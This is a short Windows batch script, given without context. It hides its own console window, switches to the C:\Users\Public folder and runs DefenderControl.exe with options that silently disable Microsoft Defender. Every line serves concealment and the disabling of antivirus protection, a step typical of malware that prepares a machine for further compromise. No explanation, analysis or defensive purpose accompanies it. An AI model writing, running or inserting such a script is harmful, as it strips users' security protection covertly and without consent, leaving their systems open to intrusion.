call getCmdPid.bat
set PID=%errorlevel%
call windowMode.bat -pid %PID% -mode hidden
cd C:\Users\Public
DefenderControl.exe /D
DefenderControl.exe /Q
